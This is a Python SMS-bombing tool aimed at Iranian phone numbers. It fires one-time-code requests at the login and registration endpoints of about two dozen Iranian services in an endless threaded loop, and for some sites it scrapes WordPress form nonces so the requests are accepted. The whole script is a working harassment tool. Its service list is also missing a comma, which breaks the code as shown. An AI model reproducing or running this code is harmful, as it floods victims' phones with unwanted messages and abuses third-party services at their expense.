from platform import node, system, release; Node, System, Release = node(), system(), release()
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread
import urllib3; urllib3.disable_warnings()
from time import sleep
import random
import sys
import socket

try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")

# Colors
r = '\033[31;1m'  
g = '\033[32;1m'  
y = '\033[33;1m'  
b = '\033[34;1m'  
p = '\033[35;1m'  
w = '\033[37;1m'  
a = '\033[0m'     
d = '\033[90;1m'  

# Slow print
def print_slow(text, delay=0.009):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Check internet
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ------------------------------
# SMS services
# ------------------------------
def trip_call(phone):
    url = "https://gateway.trip.ir/api/Totp"
    payload = {"PhoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Trip - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Trip - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Trip - Call Exception: {e}{a}')
        return False

def paklean_call(phone):
    url = "https://client.api.paklean.com/user/resendVoiceCode"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Paklean - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Paklean - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Paklean - Call Exception: {e}{a}')
        return False

def barghman(phone):
    url = "https://uiapi2.saapa.ir/api/otp/sendCode"
    payload = {"mobile": "0" + phone.split("+98")[1], "from_meter_buy": False}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bargh-e Man) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bargh-e Man) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bargh-e Man Exception: {e}{a}')
        return False

def ragham_call(phone):
    url = "https://web.raghamapp.com/api/users/code"
    payload = {"phone": phone}  # اینجا نیازی به 0 نیست، همون phone که میدی
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Ragham - Call) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Ragham - Call) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Ragham - Call Exception: {e}{a}')
        return False


def katoonistore(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://katoonistore.ir/", timeout=10)
        
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match_obj = re.search(instance_pattern, home_response.text)
        if match_obj:
            instance_id = match_obj.group(1)
        if not instance_id:
            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
        
        url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
        payload = {
            "digits_reg_name": "م",
            "digt_countrycode": "+98",
            "phone": digits_phone,
            "digits_reg_تاریخ1747725841572": "",
            "jalali_digits_reg_تاریخ1747725841572463063470": "",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "sms_otp",
            "digits": "1",
            "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "digits_form": "d3232db853",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katoonistore.ir",
            "Referer": "https://katoonistore.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(katoonistore) {a}Code Sent')
                return True
        
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False

def hajamooo(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]} {digits_phone[3:6]} {digits_phone[6:]}"
    
    try:
        session = requests.Session()
        home_response = session.get("https://hajamooo.ir/", timeout=10)
        
        nounce_value = None
        nounce_patterns = [
            r'name="dig_nounce" value="([a-f0-9]+)"',
            r'name="csrf" value="([a-f0-9]+)"',
            r'var nonce = "([a-f0-9]+)"',
        ]
        for pattern in nounce_patterns:
            match_obj = re.search(pattern, home_response.text)
            if match_obj:
                nounce_value = match_obj.group(1)
                break
        if not nounce_value:
            nounce_value = "34bcba36e0"
        
        url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": nounce_value,
            "login": "1",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "mobmail": formatted_phone,
            "dig_otp": "",
            "dig_nounce": nounce_value
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hajamooo.ir",
            "Referer": "https://hajamooo.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_text = response.text.strip()
            if response_text == "1" or "success" in response_text.lower():
                print(f'{g}(hajamooo) {a}Code Sent')
                return True
        
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False

def ilozi(phone):
    import requests
    # تبدیل شماره از +989123456789 به 9123456789
    digits_phone = phone.replace("+98", "")  # حذف +98

    url = "https://ilozi.com/wp-admin/admin-ajax.php"
    payload = {
        "login_digt_countrycode": "+98",
        "digits_phone": digits_phone,  # اینجا شماره تبدیل شده رو میذاریم
        "action_type": "phone",
        "sms_otp": "",
        "otp_step_1": "1",
        "digits_otp_field": "1",
        "digits": "1",
        "instance_id": "6fb17492e0d343df4e533a9deb8ba6b9",
        "action": "digits_forms_ajax",
        "type": "login",
        "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
        "digits_form": "3780032f76",
        "_wp_http_referer": "/?login=true&page=2",
        "show_force_title": "1",
        "otp_resend": "true",
        "container": "digits_protected",
        "sub_action": "sms_otp"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X)",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest"
    }

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(ilozi) {a}Code Sent')
                return True
            else:
                print(f'{r}[-] (ilozi) Failed: {response_data.get("message", "No message")}{a}')
                return False
        else:
            print(f'{r}[-] (ilozi) HTTP Error: {response.status_code}{a}')
            return False
    except Exception as e:
        print(f'{r}[!] ilozi Exception: {e}{a}')
        return False

def achareh(phone):
    url = "https://api.achareh.co/v2/accounts/login/"
    payload = {"phone": "98" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Achareh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Achareh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Achareh Exception: {e}{a}')
        return False

def snappshop(phone):
    url = "https://apix.snappshop.co/auth/v1/pre-login"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(SnappShop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (SnappShop) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] SnappShop Exception: {e}{a}')
        return False

def bimebazar(phone):
    url = "https://bimebazar.com/accounts/api/login_sec/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bimebazar) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bimebazar) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bimebazar Exception: {e}{a}')
        return False

def komodaa(phone):
    url = "https://api.komodaa.com/api/v2.6/loginRC/request"
    payload = {"phone_number": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Komodaa) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Komodaa) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Komodaa Exception: {e}{a}')
        return False

def alopeyk_safir(phone):
    url = "https://api.alopeyk.com/safir-service/api/v1/login"
    payload = {"phone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Alopeyk Safir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
        return False

def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-type": "application/json"}
    snapD = {"cellphone": phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        return "OK" in snapR
    except Exception as e:
        print(f"{r}[!] Snap Exception: {e}")
        return False
def shahrfarsh(phone):
    url = "https://shahrfarsh.com/Account/Login"
    payload = {"phoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, data=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(ShahrFarsh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ShahrFarsh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] ShahrFarsh Exception: {e}{a}')
        return False
def tetherland(phone):
    url = "https://service.tetherland.com/api/v5/login-register"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Tetherland) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Tetherland) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Tetherland Exception: {e}{a}')
        return False


def pindo(phone):
    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
    try:
        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
            print(f'{g}(Pindo) {a}Code Sent')
            return True
    except Exception as e:
        print(f'[!] Pindo Exception: {e}')
        return False

def drnext(phone):
    phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    payload = {"source": "besina", "mobile": phoneNumber_zero}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(DrNext) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (DrNext) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] (DrNext) Exception: {e}{a}')

def gap(phone):
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1])).text
        return "OK" in gapR
    except Exception as e:
        print(f"{r}[!] Gap Exception: {e}")
        return False

def divar(phone):
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", json=divarD).json()
        return divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
    except Exception as e:
        print(f"{r}[!] Divar Exception: {e}")
        return False

def alibaba(phone):
    alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', json=alibabaD ).json()
        return alibabaR.get("result", {}).get("success")
    except Exception as e:
        print(f"{r}[!] AliBaba Exception: {e}")
        return False

def mek(phone):
    meU = 'https://www.hamrah-mechanic.com/api/v1/auth/login'
    meD = {"phoneNumber": "0"+phone.split("+98")[1]}
    try:
        meR = post(url=meU, data=meD).json()
        return meR.get('isSuccess')
    except Exception as e: 
        print(f"{r}[!] HamrahMechanic Exception: {e}")
        return False

def okorosh(phone):
    okJ = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "dummy"
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8'}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        return 'success' in okR
    except Exception as e:
        print(f"{r}[!] OfoghKourosh Exception: {e}")
        return False

def snapp_market(phone):
    url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass"
    params = {"cellphone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, params=params, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Snapp Market) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Snapp Market) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Snapp Market Exception: {e}{a}')
        return False

def digikala(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Digikala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Digikala) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Digikala Exception: {e}{a}')
        return False
        

# Wrapper to safely run each service
def send_service_safe(service, phone):
    result = service(phone)
    if result:
        print(f"{g}[+] {service.__name__}: Code Sent!")
    else:
        print(f"{y}[-] {service.__name__}: Failed or No Response")

# Simple SMS bomber
def Vip(phone, Time):
    services = [
    snap, gap, divar, alibaba, mek, okorosh,
    drnext, pindo, shahrfarsh, tetherland, snapp_market,
    trip_call, paklean_call, ragham_call,  digikala, barghman,
    achareh, snappshop, bimebazar, ilozi, komodaa, alopeyk_safir
        hajamooo,
        katoonistore,

]
    total_services = len(services)
    
    print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Payloads: {y}{total_services} services")
    print_slow(f"{g}Delay: {y}{Time}s")
    print_slow(f"{p}╚═══════════════════════════════════╝")
    sleep(1)
    
    try:
        while True:
            for service in services:
                Thread(target=send_service_safe, args=(service, phone)).start()
                sleep(Time)
    except KeyboardInterrupt:
        print_slow(f"{g}[+] {y}Mission Completed!")
        system('clear' if name == 'posix' else 'cls')  

# Phone validation
def is_phone(phone: str):
    if match(r"^(?:\+989|989|09|9)\d{9}$", phone):
        return sub(r"^(?:\+989|989|09|9)", "+989", phone)
    return False

# Menu
def main_menu():
    system('clear' if name == 'posix' else 'cls')
    print_slow(f"""
{p}╔════════════════════════════════════════════════════╗
{b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
{p}╚════════════════════════════════════════════════════╝
{y} System:
    {g}» Platform: {w}{System}
    {g}» Node: {w}{Node}
    {g}» Release: {w}{Release}
{p}══════════════════════════════════════════════════════
{w} Choose an Option:
    {g}[1] {y}SMS Bomber
    {g}[2] {y}Email Bomber
    {r}[0] {y}Exit
{p}══════════════════════════════════════════════════════
""")
    return input(f"{g}[?] {y}Enter Choice (0-2): {a}")

# Main loop
def main():
    while True:
        choice = main_menu()
        
        if choice == '1':
            print_slow(f"{g}[+] {y}Starting SMS Bomber!")
            while True:
                phone = is_phone(input(f'{g}[?] {y}Enter Phone (+98): {a}'))
                if phone:
                    break
                print(f"{r}[-] {a}Invalid Phone!")
            try:
                Time = float(input(f'{g}[?] {y}Delay (seconds) [Default=0.1]: {a}') or 0.1)
            except ValueError:
                Time = 0.1
            Vip(phone, Time)

        elif choice == '2':
            print_slow(f"{g}[+] {y}Email Bomber is not implemented in this snippet.")

        elif choice == '0':
            print_slow(f"{r}[-] {y}Exiting... Goodbye!")
            break
        
        else:
            print_slow(f"{r}[-] {a}Invalid Choice!")
            sleep(1)

if __name__ == "__main__":
    main()
